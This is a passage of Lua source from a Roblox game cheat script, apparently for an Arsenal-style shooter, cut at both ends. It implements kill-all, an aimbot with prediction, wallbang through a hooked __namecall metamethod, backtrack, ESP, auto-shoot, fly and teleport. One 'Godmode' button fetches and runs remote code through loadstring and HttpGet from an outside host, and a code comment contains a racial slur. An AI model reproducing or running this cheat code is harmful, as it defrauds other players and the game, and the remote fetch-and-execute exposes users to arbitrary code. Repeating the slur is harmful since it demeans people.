                    for i, vv in pairs(v:GetChildren()) do
                        if vv.Name == "Left Arm" then
                            vv.Anchored = true
                            
                        end
                                
                        if vv.Name == "Right Arm" then 
                            vv.Anchored = true

                        end
                    end    
                end
            end
        end
end
end

if configTable.ForceKillAll and configTable.normal then
        print("y")
        for _,v in next, game.Players:GetPlayers() do
                if game:GetService("ReplicatedStorage").wkspc.FFA.Value then
                    local gun = game.Players.LocalPlayer.NRPBS.EquippedTool.Value
                    if v.Character and v.Name ~= game.Players.LocalPlayer.Name and v.Character:FindFirstChild("Spawned") and gun~='Rocket Launcher' and gun~='Concussion Rifle'and gun~='Arm Cannon'and gun~='RPG'and gun~='Firework Launcher' then
                        for i = 1, 10 do 
                            arsonfuncs:KillPlayer(v)
                        end
                    end
                else
                    if v.Character and v.Name ~= game.Players.LocalPlayer.Name and v.Character:FindFirstChild("Spawned") and v.TeamColor ~= game.Players.LocalPlayer.TeamColor then
                        for i = 1, 10 do 
                            arsonfuncs:KillPlayer(v)
                        end
                    end   
                end
            end   
    end



--[[

if configTable.Hitboxes then

local players = arsonfuncs:getplrsname()
local plr = game[players].LocalPlayer
for _,v in pairs(game[players]:GetPlayers()) do
    if v.Name ~= plr.Name and v.Character then
        if v.Character:FindFirstChild("HeadHB") and v.Character:FindFirstChild("HumanoidRootPart") then
            if v.Character.HeadHB.Size~=getgenv().HeadSize and v.Character.HumanoidRootPart.Size~=getgenv().HumSize then
                v.Character.HeadHB.CanCollide = false
                v.Character.HeadHB.Transparency = 10
                v.Character.HeadHB.Size = getgenv().HeadSize
                
                v.Character.HumanoidRootPart.CanCollide = false
                v.Character.HumanoidRootPart.Transparency = 10
                v.Character.HumanoidRootPart.Size = getgenv().HumSize
            end
        end
    end
end
else
    
local players = arsonfuncs:getplrsname()
local plr = game[players].LocalPlayer
for _,v in pairs(game[players]:GetPlayers()) do
if v.Name ~= plr.Name and v.Character then
if v.Character:FindFirstChild("HeadHB") and v.Character:FindFirstChild("HumanoidRootPart") then
v.Character.HeadHB.CanCollide = false
v.Character.HeadHB.Transparency = 10
v.Character.HeadHB.Size = Vector3.new(1.4498, 1.3018, 1.3018)

v.Character.HumanoidRootPart.CanCollide = false
v.Character.HumanoidRootPart.Transparency = 10
v.Character.HumanoidRootPart.Size = Vector3.new(2.1,2.1,2.1)

end
end
end    
end
]]
    if configTable.BunnyHop and configTable.BHopMethod == "Humanoid"then
        if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.Space) and game.Players.LocalPlayer.Character then
            game.Players.LocalPlayer.Character.Humanoid.Jump=true
        end
    end
    
    --[[
    if true then
        for _, v in next, game.Players:GetPlayers() do 
            if v.TeamColor~=game.Players.LocalPlayer.TeamColor and v.Character and not arsonfuncs:IsSecure(v) then
                for _new, val in pairs(v.Character:GetDescendants())do
                    if val:IsA("BasePart") then
                        local new=val:Clone()
                        local storedData=Instance.new('Model',arsonfuncs:GetSecureFolder())
                        storedData.Name=v.Name
                        new.Parent = storedData
                        new.Anchored = true
                        new.CanCollide = false
                        new.Reflectance=0
                        new.Name = val.Name
                        new.Material=Enum.Material.ForceField
                        
                        if new:IsA("MeshPart")then
                            new.TextureID=""
                        end
                        for _,c in pairs(new:GetChildren())do
                            if not c:IsA("SpecialMesh")then
                                c:Destroy()
                            else
                                c.TextureId=""
                            end
                        end
                    end
                end
            end
        end
        
        task.wait(1.3)
        SecureFolder:ClearAllChildren() -- clears all the backtrack
    end
    ]]
    
            
       for _, vls in pairs(workspace.Camera:GetChildren()) do
                if vls and vls:IsA("Model") and configTable.Rainbow then
                    for __, v in pairs(vls:GetChildren()) do
                        if v:IsA("Model") then
                            for i, vv in pairs(v:GetChildren()) do
                            if vv.Name == "Left Arm" then
                                vv.Transparency = .5
                                vv.Material = Enum.Material.ForceField
                                vv.Color = Color3.fromHSV(tick()%5/5,1,1)    
                            end
                            
                            if vv.Name == "Right Arm" then
                                vv.Transparency = .5
                                vv.Material = Enum.Material.ForceField
                                vv.Color = Color3.fromHSV(tick()%5/5,1,1)
                            end
                        end    
                        end
                    end
                end
                     
            end
     

    

    --[[if configTable.GunChams and configTable.GC_THEME == "NewV2" then
        for a,b in pairs(workspace.Camera:GetChildren()) do 
          for c,d in pairs(game:GetService("ReplicatedStorage").Weapons:GetChildren()) do
            if b.Name == d.Name then 
              for e,f in pairs(b:GetChildren()) do 
                if f:IsA("BasePart") then 
                  f.Color = Color3.fromHSV(tick()%5/5,1,1)
                  f.Material = "Neon"
                end
              end
            end
          end
        end    
    end
    if xonae then
        game.CoreGui.NewNotifUI.Frame.TextLabel.Text='[LOG]: Hit: '..args[1].Name
    	game.CoreGui.NewNotifUI.Frame.Visible = true;
    	task.wait(1.2)
    	game.CoreGui.NewNotifUI.Frame.Visible = false;
    	xonae=false;
    end
     if configTable.GunChams then
            if workspace.CurrentCamera:FindFirstChild("Arms") then
                if workspace.CurrentCamera.Arms:FindFirstChild("new") then
                    for _global_index, v in pairs(workspace.CurrentCamera.Arms.new:GetChildren()) do
                        for __newindexF,v2 in pairs(v:GetDescendants()) do
                            if v2:IsA("SpecialMesh") then
                                v2.TextureId = ""    
                            end
                            
                            if v2:IsA("Decal") then
                                v2:Destroy()    
                            end
                        end
                        
                        if configTable.GC_THEME == "aimhook" then
                            v.BrickColor = BrickColor.new("Deep blue")
                            v.Material = Enum.Material.ForceField

                        end
                        if configTable.GC_THEME == "stormware.cc" then
                            v.BrickColor = BrickColor.new("Royal purple")
                            v.Material = Enum.Material.ForceField
                        end
                        if configTable.GC_THEME == "lgbtq" then
                            v.Material = Enum.Material.Neon
                            v.Color = Color3.fromHSV(tick()%5/5,1,1)
                        end
                        
                        if configTable.GC_THEME == "custom" then
                            v.Material = configTable.CustomMaterial;
                            v.Color = configTable.CustomColor;
                        end
                        if configTable.GC_THEME == "onetap.lua" then
                            v.BrickColor = BrickColor.new("Bright yellow")
                            v.Material = Enum.Material.ForceField
                        end
                        
                        v.Transparency = configTable.GC_TRANSPARENCY
                    end
                else
                    for __protectedIndex, vs in pairs(workspace.CurrentCamera.Arms:GetChildren()) do
                        --if not vs:IsA("MeshPart") then end
                        if vs:IsA("MeshPart") and vs.Transparency ~= 1 then
                            vs.Material = Enum.Material.ForceField
                            if configTable.GC_THEME == "aimhook" then
                                vs.BrickColor = BrickColor.new("Deep blue")    
                            end
                            if configTable.GC_THEME == "stormware.cc" then
                                vs.BrickColor = BrickColor.new("Royal purple")    
                            end
                            if configTable.GC_THEME == "onetap.lua" then
                                vs.BrickColor = BrickColor.new("Bright yellow")    
                            end
                            if configTable.GC_THEME == "lgbtq" then
                                vs.Material = Enum.Material.Neon
                                vs.Color = Color3.fromHSV(tick()%5/5,1,1)
                            end
                        
                            if configTable.GC_THEME == "custom" then
                                vs.Material = configTable.CustomMaterial;
                                vs.Color = configTable.CustomColor;
                            end
                            vs.Transparency = configTable.GC_TRANSPARENCY or .5
                        end
                    end
                end
                
                
            end
        end
        ]]
end)

-- copied from sw lite
 local b0 = game:GetService "Players".LocalPlayer
    local b1 = game:GetService "UserInputService"
    b1.InputBegan:connect(
        function(b2)
            if b2.UserInputType == Enum.UserInputType.Keyboard and b2.KeyCode == Enum.KeyCode.W then
                _G.Running = true
            end
        end
    )
    b1.InputEnded:connect(
        function(b2)
            if b2.UserInputType == Enum.UserInputType.Keyboard and b2.KeyCode == Enum.KeyCode.W then
                _G.Running = false
            end
        end
    )




vSec:AddSlider("TimeDelusion", 1, 1, 10, 1, function(State)
    game:GetService("ReplicatedStorage").wkspc.TimeScale.Value = State
end)

local ToggleBind = vSec:AddToggle("Infinite Jump", false, function(e)
    configTable.InfJump = e
end)

local ToggleBind = vSec:AddToggle("Ctrl+Click TP", false, function(e)
    configTable.TP = e
end)
charMods:AddToggle("Instant Respawn",false,function(x)
    configTable.Revive=x;    
end)

local ToggleBind53 = charMods:AddButton("Top G Glasses", function(e)
    while task.wait() do
        game:GetService("ReplicatedStorage").Events.Sunglasses:FireServer()    
    end
end)

charMods:AddButton("FE Godmode V3", function(x)
    local LocalPlayer = game.Players.LocalPlayer
    LocalPlayer.Character.Humanoid.Parent = nil
    Instance.new("Humanoid", LocalPlayer.Character) 
end)


charMods:AddButton("FE Godmode V2", function(x)
    loadstring(game:HttpGet("https://GANGofGANG.gog-best.repl.co/aimhook/script_assets/godmode.lua"))()    
end)


charMods:AddButton("FE Godmode", function(x)
    if not game.Players.LocalPlayer.Character then return end
    local cframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    local troll_cframe = CFrame.new(-45591, 46595, -4822) -- void, have fun wallbanging LOL.
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = troll_cframe
    
    game.Players.LocalPlayer.Character.LeftLowerArm:Destroy()
    game.Players.LocalPlayer.Character.LeftUpperArm:Destroy()
    game.Players.LocalPlayer.Character.RightLowerArm:Destroy()
    game.Players.LocalPlayer.Character.RightUpperArm:Destroy()
    game.Players.LocalPlayer.Character.LeftFoot:Destroy()
    game.Players.LocalPlayer.Character.LeftLowerLeg:Destroy()
    game.Players.LocalPlayer.Character.LeftUpperLeg:Destroy()
    game.Players.LocalPlayer.Character.RightFoot:Destroy()
    game.Players.LocalPlayer.Character.RightLowerLeg:Destroy()
    game.Players.LocalPlayer.Character.RightUpperLeg:Destroy()
    local esc = game.Players.LocalPlayer.Character.LowerTorso:GetChildren()
       for i, v in pairs(esc) do
         v:Destroy()
         wait()
       end
    
    local Core = getsenv(game.Players.LocalPlayer.PlayerGui.Menew.LocalScript);
    local Loadout;
    for i,v in pairs(getupvalues(Core.ViewItems)) do
        if typeof(v) == "table" then
            if v.Skins then
                Loadout = v;
            end
        end
    end
    table.insert(Loadout.Skins, "Nonexisty")
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cframe    
end)

charMods:AddButton("FE KillBrick", function(x)
    local Core = getsenv(game.Players.LocalPlayer.PlayerGui.Menew.LocalScript);

    local Loadout;
    for i,v in pairs(getupvalues(Core.ViewItems)) do
        if typeof(v) == "table" then
            if v.Skins then
                Loadout = v;
            end
        end
    end
    
    table.insert(Loadout.Skins, "KillBrick");
    game.Players.LocalPlayer.Data.Skin.Value = "KillBrick"
    game.Players.LocalPlayer.Character.LeftLowerArm:Destroy()
    game.Players.LocalPlayer.Character.LeftUpperArm:Destroy()
    game.Players.LocalPlayer.Character.RightLowerArm:Destroy()
    game.Players.LocalPlayer.Character.RightUpperArm:Destroy()
    game.Players.LocalPlayer.Character.LeftFoot:Destroy()
    game.Players.LocalPlayer.Character.LeftLowerLeg:Destroy()
    game.Players.LocalPlayer.Character.LeftUpperLeg:Destroy()
    game.Players.LocalPlayer.Character.RightFoot:Destroy()
    game.Players.LocalPlayer.Character.RightLowerLeg:Destroy()
    game.Players.LocalPlayer.Character.RightUpperLeg:Destroy()
    game.Players.LocalPlayer.Character.FakeHead:Destroy()
    local esc = game.Players.LocalPlayer.Character.UpperTorso:GetChildren()
    for i, v in pairs(esc) do
        v:Destroy()
        wait()
    end    
end)

charMods:AddButton("FE AntiHead", function()
    -- pretty much guranteed it exists, but a check can never hurt.
    if game.Players.LocalPlayer.Character:FindFirstChild("HeadHB")then
        game.Players.LocalPlayer.Character:FindFirstChild("HeadHB"):Destroy()
    end
    
    if game.Players.LocalPlayer.Character:FindFirstChild("FakeHead")then
        game.Players.LocalPlayer.Character:FindFirstChild("FakeHead"):Destroy()
    end
    
end)

local player = game.Players.LocalPlayer
local UIS = game:GetService'UserInputService';
	
	_G.JumpHeight = 50;
	
	function Action(Object, Function) if Object ~= nil then Function(Object); end end
	
	UIS.InputBegan:connect(function(UserInput)
		if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space and configTable.InfJump then
			Action(player.Character.Humanoid, function(self)
				if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
					Action(self.Parent.HumanoidRootPart, function(self)
						self.Velocity = Vector3.new(0, _G.JumpHeight, 0);
					end)
				end
			end)
		end
	end)

local mouse2 = game.Players.LocalPlayer:GetMouse()
mouse2.Button1Down:connect(
		function()
		    if not mouse2 then return end
			if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl) then
				return
			end
			if not mouse2.Target then
				return
			end
			
			if configTable.TP then
				
			
				player.Character:MoveTo(mouse2.Hit.p)
			end
		end
	)


local ToggleBinder = vSec:AddToggle("ThirdPerson", false, function(e)
    --shared.ThirdPerson=e;
end)

ToggleBinder:AddKeybind()

vSec:AddToggle("ForceMenu [V]", false, function(x)
    configTable.ForceMenu = x
end)

game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(k)
    if k == "v" and configTable.ForceMenu then
        print("aeaea")
        game.Players.LocalPlayer.PlayerGui.Menew.Enabled = not game.Players.LocalPlayer.PlayerGui.Menew.Enabled
    end
end)

local newbinde=vSec:AddToggle("ForceKillAll",false,function(x)
    configTable.ForceKillAll=x;
end)
vSec:AddDropdown("Kill All Type", {"normal", "heartbeat"}, "normal",false, function(x)
    if x == 'normal'then
        print('e')
        configTable.normal=true
    else configTable.normal=false end
    configTable.ktype=x;
end)


newbinde:AddKeybind()




AimingTab:CreateConfigSystem("right") --this is the config system





getgenv().OldAimPart = configTable.LocalAimPart
getgenv().AimPart =  configTable.LocalAimPart
    getgenv().AimlockKey = "c"
    getgenv().AimRadius = 90 -- How far away from someones character you want to lock on at
    getgenv().ThirdPerson = true 
    getgenv().FirstPerson = true
    getgenv().TeamCheck = true -- Check if Target is on your Team (True means it wont lock onto your teamates, false is vice versa) (Set it to false if there are no teams)
    getgenv().PredictMovement = true -- Predicts if they are moving in fast velocity (like jumping) so the aimbot will go a bit faster to match their speed 
    getgenv().PredictionVelocity = 6.612
    getgenv().CheckIfJumped = true
    getgenv().Smoothness = true
    getgenv().SmoothnessAmount = 0.08

    local Players, Uis, RService, SGui = game:GetService"Players", game:GetService"UserInputService", game:GetService"RunService", game:GetService"StarterGui";
    local Client, Mouse, Camera, CF, RNew, Vec3, Vec2 = Players.LocalPlayer, Players.LocalPlayer:GetMouse(), workspace.CurrentCamera, CFrame.new, Ray.new, Vector3.new, Vector2.new;
    local Aimlock, MousePressed, CanNotify = true, false, false;
    local AimlockTarget;
    local OldPre;
    

    
    getgenv().WorldToViewportPoint = function(P)
        return Camera:WorldToViewportPoint(P)
    end
    
    getgenv().WorldToScreenPoint = function(P)
        return Camera.WorldToScreenPoint(Camera, P)
    end
    
    getgenv().GetObscuringObjects = function(T)
        if T and T:FindFirstChild(getgenv().AimPart) and Client and Client.Character:FindFirstChild("Head") then 
            local RayPos = workspace:FindPartOnRay(RNew(
                T[getgenv().AimPart].Position, Client.Character.Head.Position)
            )
            if RayPos then return RayPos:IsDescendantOf(T) end
        end
    end
    
    getgenv().GetNearestTarget = function()
        
        local players = {}
        local PLAYER_HOLD  = {}
        local DISTANCES = {}
        for i, v in pairs(Players:GetPlayers()) do
            if v ~= Client then
                table.insert(players, v)
            end
        end
        for i, v in pairs(players) do
            if v.Character ~= nil then
                local AIM = v.Character:FindFirstChild("Head")
                if getgenv().TeamCheck == true and v.Team ~= Client.Team then
                    local DISTANCE = (v.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
                    local RAY = Ray.new(game.Workspace.CurrentCamera.CFrame.p, (Mouse.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * DISTANCE)
                    local HIT,POS = game.Workspace:FindPartOnRay(RAY, game.Workspace)
                    local DIFF = math.floor((POS - AIM.Position).magnitude)
                    PLAYER_HOLD[v.Name .. i] = {}
                    PLAYER_HOLD[v.Name .. i].dist= DISTANCE
                    PLAYER_HOLD[v.Name .. i].plr = v
                    PLAYER_HOLD[v.Name .. i].diff = DIFF
                    table.insert(DISTANCES, DIFF)
                elseif getgenv().TeamCheck == false and v.Team == Client.Team then 
                    local DISTANCE = (v.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
                    local RAY = Ray.new(game.Workspace.CurrentCamera.CFrame.p, (Mouse.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * DISTANCE)
                    local HIT,POS = game.Workspace:FindPartOnRay(RAY, game.Workspace)
                    local DIFF = math.floor((POS - AIM.Position).magnitude)
                    PLAYER_HOLD[v.Name .. i] = {}
                    PLAYER_HOLD[v.Name .. i].dist= DISTANCE
                    PLAYER_HOLD[v.Name .. i].plr = v
                    PLAYER_HOLD[v.Name .. i].diff = DIFF
                    table.insert(DISTANCES, DIFF)
                end
            end
        end
        
        if unpack(DISTANCES) == nil then
            return nil
        end
        
        local L_DISTANCE = math.floor(math.min(unpack(DISTANCES)))
        if L_DISTANCE > getgenv().AimRadius then
            return nil
        end
        
        for i, v in pairs(PLAYER_HOLD) do
            if v.diff == L_DISTANCE then
                return v.plr
            end
        end
        return nil
    end
    Uis.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton2 and configTable.AimBot then
            if AimlockTarget == nil then
                pcall(function()
                    if MousePressed ~= true then MousePressed = true end 
                    local Target;Target = GetNearestTarget()
                    if Target ~= nil then 
                        AimlockTarget = Target
                    end
                end)
            elseif a == AimlockKey and AimlockTarget ~= nil then
                if AimlockTarget ~= nil then AimlockTarget = nil end
                if MousePressed ~= false then 
                    MousePressed = false 
                end
            end
        end
    end)
    
    Uis.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton2 and configTable.AimBot then
            if AimlockTarget ~= nil then AimlockTarget = nil end
                if MousePressed ~= false then 
                    MousePressed = false 
                end
        end
    end)
    
   
    RService.RenderStepped:Connect(function()
        if configTable.UseCustomRotation and game.Players.LocalPlayer.Character then
            arsonfuncs:RotatePlayer(workspace.CurrentCamera.CFrame * CFrame.new(configTable.RotationY,0,0))    
        end
        
        if game.Players.LocalPlayer.Character:FindFirstChild("Gun") and configTable.Backtrack then
                        for _, v in pairs(game.Players:GetPlayers())do
                            if v.Character and v.TeamColor ~= game.Players.LocalPlayer.TeamColor and v ~= game.Players.LocalPlayer and v.Character:FindFirstChild("Spawned") then
                                local track = Instance.new("Part")
        						track.Name = v.Name
        						track.Anchored = true
        						track.Material = configTable.Backmat
        						track.CanCollide = false
        						track.Transparency = 0
        						track.Color = configTable.BacktrackColor
        						track.Size = v.Character.Head.Size 
        						track.CFrame = v.Character.Head.CFrame
        						track.Parent = arsonfuncs:GetSecureFolder()
        						if configTable.Hideback then
        						    track.Transparency = 1     
        						end
        						
        						local BacktrackTag = Instance.new("ObjectValue")
        						BacktrackTag.Parent = track
        						BacktrackTag.Name = "PlayerName"
        						BacktrackTag.Value = v
        						
        						spawn(function()
        							task.wait(configTable.BacktrackDelay/10000)
        							track:Destroy()
        						end)
                            else
                            end
                        end
            end
        if getgenv().ThirdPerson == true and getgenv().FirstPerson == true then 
            if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude > 1 or (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude <= 1 then 
                CanNotify = true 
            else 
                CanNotify = false 
            end
        elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then 
            if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude > 1 then 
                CanNotify = true 
            else 
                CanNotify = false 
            end
        elseif getgenv().ThirdPerson == false and getgenv().FirstPerson == true then 
            if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude <= 1 then 
                CanNotify = true 
            else 
                CanNotify = false 
            end
        end
        if Aimlock == true and MousePressed == true then 
            if AimlockTarget and AimlockTarget.Character and AimlockTarget.Character:FindFirstChild(getgenv().AimPart) and AimlockTarget.NRPBS.Health.Value > 0 then 
                if getgenv().FirstPerson == true then
                    if CanNotify == true then
                        if getgenv().PredictMovement == true then
                            if getgenv().Smoothness == true and AimlockTarget.NRPBS.Health.Value > 0  then
                                --// The part we're going to lerp/smoothen \\--
                                local Main = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position + AimlockTarget.Character[getgenv().AimPart].Velocity/PredictionVelocity)
                                
                                --// Making it work \\--
                                Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().SmoothnessAmount, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut)
                            else
                                Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position + AimlockTarget.Character[getgenv().AimPart].Velocity/PredictionVelocity)
                            end
                        elseif getgenv().PredictMovement == false then 
                            if getgenv().Smoothness == true then
                                --// The part we're going to lerp/smoothen \\--
                                local Main = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position)

                                --// Making it work \\--
                                Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().SmoothnessAmount, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut)
                            else
                                Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position)
                            end
                        end
                    end
                end
            end
        end
     
end)


local hah
hah = hookmetamethod(game, "__namecall", function(self, ...)
    local Args = {...}
    NamecallMethod = getnamecallmethod()
    if tostring(NamecallMethod) == "FindPartOnRayWithIgnoreList" and configTable.Wallbang and not checkcaller() then
        table.insert(Args[2], workspace.Map)
    end
   
    return hah(self, ...)
end)


testSection:AddToggle("Wallbang",false, function(v)
    configTable.Wallbang=v;
end)
testSection:AddToggle("KillAura",false, function(v)
    configTable.KillAura=v;
end)



	repeat wait() 
	until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
	local mouse = game.Players.LocalPlayer:GetMouse() 
	repeat wait() until mouse
	local plr = game.Players.LocalPlayer 
	local torso = plr.Character.Head 
	local flying = false
	local deb = true 
	local ctrl = {f = 0, b = 0, l = 0, r = 0} 
	local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
	local maxspeed = 300
	local speed = 0 
	
	function Fly() 
		local bg = Instance.new("BodyGyro", torso) 
		bg.P = 9e4
		bg.Name = "y"..math.random(1,100000000)
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
		bg.cframe = torso.CFrame 
		local bv = Instance.new("BodyVelocity", torso) 
		bv.velocity = Vector3.new(0,0.1,0) 
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
		repeat wait() 
			plr.Character.Humanoid.PlatformStand = true 
			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
				speed = speed+.5+(speed/maxspeed) 
				if speed > maxspeed then 
					speed = maxspeed 
				end 
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
				speed = speed-1 
				if speed < 0 then 
					speed = 0 
				end 
			end 
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
			else 
				bv.velocity = Vector3.new(0,0.1,0) 
			end 
			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
		until not flying 
		ctrl = {f = 0, b = 0, l = 0, r = 0} 
		lastctrl = {f = 0, b = 0, l = 0, r = 0} 
		speed = 0 
		bg:Destroy() 
		bv:Destroy() 
		plr.Character.Humanoid.PlatformStand = false 
	end 
	mouse.KeyDown:connect(function(key) 
		if key:lower() == "t" and configTable.Fly then 
			if flying then flying = false 
			else 
				flying = true 
				Fly() 
			end 
		elseif key:lower() == "w" then 
			ctrl.f = 1 
		elseif key:lower() == "s" then 
			ctrl.b = -1 
		elseif key:lower() == "a" then 
			ctrl.l = -1 
		elseif key:lower() == "d" then 
			ctrl.r = 1 
		end 
	end) 
	mouse.KeyUp:connect(function(key) 
		if key:lower() == "w" then 
			ctrl.f = 0 
		elseif key:lower() == "s" then 
			ctrl.b = 0 
		elseif key:lower() == "a" then 
			ctrl.l = 0 
		elseif key:lower() == "d" then 
			ctrl.r = 0 
		end 
	end)
	Fly()
	
	
	mouse.Button1Down:connect(
		function()
			if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl) then
				return
			end
			if not mouse.Target then
				return
			end
			
			if not mouse.Hit then
			        
			end
			
			if configTable.TP then
				
			
				player.Character:MoveTo(mouse.Hit.p)
			end
		end
	)
	
	
local dwLocalPlayer = game.Players.LocalPlayer
local dwMouse = dwLocalPlayer:GetMouse()
local dwCamera = workspace.CurrentCamera

-- not needed, but for future use probably.
function getWalls(target)
    if not dwLocalPlayer.Character then return end
    local raycast = Ray.new(dwLocalPlayer.Character.Head.Position, (target.Position - dwLocalPlayer.Character.Head.Position).Unit*300)
    local close_part, position = game:GetService("Workspace"):FindPartOnRayWithIgnoreList(raycast, {
        dwLocalPlayer.Character
    },
    false,
    true
    )

    if close_part then
        local hum = close_part.Parent:FindFirstChildOfClass("Humanoid")
        --if not hum.Parent and not hum.Parent.Parent then return end
        if not hum then
            --hum = part.Parent.Parent:FindFirstChildOfClass("Humanoid")    
        end
        
        if hum and target and hum.Parent == target.Parent then
            local pos, is_visible = dwCamera:WorldToScreenPoint(target.Position)
            if is_visible then
                return true    
            end
        end
    end
end


game.RunService.RenderStepped:Connect(function()
    
    local dist = math.huge
    local closest_char = nil

    

 
    for i,v in next, game.Players:GetChildren() do 

            if v ~= dwLocalPlayer and
            v.Character and
            v.Character:FindFirstChild("HumanoidRootPart") and
            v.Character:FindFirstChild("Humanoid") and
            v.Character:FindFirstChild("Humanoid").Health > 0 and v.NRPBS.Health.Value ~= -100 and configTable.AutoShoot then

                if v and
                v.Team ~= dwLocalPlayer.Team  then

                    local char = v.Character
                    local char_part_pos, is_onscreen = dwCamera:WorldToViewportPoint(char["Head"].Position)

                    if is_onscreen --[[ and getWalls(v.Character.Head)]] then

                        local mag = (Vector2.new(dwMouse.X, dwMouse.Y) - Vector2.new(char_part_pos.X, char_part_pos.Y)).Magnitude

                        if mag < dist and mag < 350 then
                            mouse1press()
                            task.wait(0.9)
                            mouse1release()
                        end
                    end
                end
            end
        end
end)
	
	 local gui = Instance.new("BillboardGui")
        local esp = Instance.new("TextLabel",gui) -- i hate niggers
        
        
        
        gui.Name = name; -- gui to lua guh
        gui.ResetOnSpawn = false
        gui.AlwaysOnTop = true;
        gui.LightInfluence = 0;
        gui.Size = UDim2.new(1.75, 0, 1.75, 0);
        esp.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
        esp.Text = ""
        esp.Size = UDim2.new(0.0001, 0.00001, 0.0001, 0.00001);
        esp.BorderSizePixel = 4;
        esp.BorderColor3 = configTable.NameESP.Color;
        esp.BorderSizePixel = 0
        esp.Font = Enum.Font.Code;
        esp.TextSize = configTable.NameESP.TextSize;
        esp.TextColor3 = configTable.NameESP.Color;
	
	local player = game:GetService("Players").LocalPlayer
    local mouseGet = player:GetMouse()
    game:GetService("RunService").RenderStepped:Connect(function()
        
        if configTable.AutoShoot2 then
            game:GetService("VirtualUser"):Button1Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        end
        
        

        esp.TextSize = configTable.NameESP.TextSize;
        esp.Font = configTable.NameESP.Font;
        esp.TextColor3 = configTable.NameESP.Color;
        esp.BorderColor3 = configTable.NameESP.Color;
       
        if configTable.NESP then
            
            for _,v in pairs (game:GetService("Players"):GetPlayers()) do
                if v ~= game:GetService("Players").LocalPlayer and v.Character and v.Character:FindFirstChild("Head") and not v.Character.Head:FindFirstChild(name) and v.TeamColor ~= game:GetService("Players").LocalPlayer.TeamColor then 
                    esp.Text = "["..v.Name.."]"
                    if v.Character:FindFirstChild("Head") then
                        gui:Clone().Parent = v.Character.Head
                    end
                end
            end
        else
            for _,v in pairs (game:GetService("Players"):GetPlayers()) do
                if v.Character and v.Character:FindFirstChild("Head") and v.Character.Head:FindFirstChild(name) then 
                    v.Character.Head[name]:Destroy()
                end
            end  
        end

        if configTable.BunnyHop then
            if configTable.BHopMethod == "Velocity" then
                if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("UpperTorso") then
                    BodyVelocity:Destroy()
            		BodyVelocity = Instance.new("BodyVelocity")
            		BodyVelocity.Name = '()()'
            		BodyVelocity.MaxForce = Vector3.new(math.huge,0,math.huge)
            		if UserInputService:IsKeyDown("Space") then
            			local add = 0
            			if UserInputService:IsKeyDown("A") then add = 90 end
            			if UserInputService:IsKeyDown("S") then add = 180 end
            			if UserInputService:IsKeyDown("D") then add = 270 end
            			if UserInputService:IsKeyDown("A") and UserInputService:IsKeyDown("W") then add = 45 end
            			if UserInputService:IsKeyDown("D") and UserInputService:IsKeyDown("W") then add = 315 end
            			if UserInputService:IsKeyDown("D") and UserInputService:IsKeyDown("S") then add = 225 end
            			if UserInputService:IsKeyDown("A") and UserInputService:IsKeyDown("S") then add = 145 end
